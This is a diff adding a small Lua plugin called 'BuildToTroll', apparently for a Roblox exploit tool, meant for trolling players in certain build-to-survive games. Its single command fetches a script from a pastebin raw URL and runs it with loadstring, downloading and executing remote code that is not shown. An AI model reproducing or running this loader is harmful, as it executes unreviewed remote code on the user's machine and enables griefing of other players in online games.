@@ -1,0 +1,15 @@
+local Plugin = {
+	["PluginName"] = "BuildToTroll",
+	["PluginDescription"] = " Only work on certain build to survive games",
+	["Commands"] = {
+		["BTT"] = {
+			["Description"] = "Ahhhhhhhhhhhh",
+			["Aliases"] = {'BTT'},
+			["Function"] = function(args,speaker)
+				loadstring(game:HttpGet(("https://pastebin.com/raw/Lg2gqFCu"),true))()
+			end,
+		},
+	},
+}
+
+return Plugin
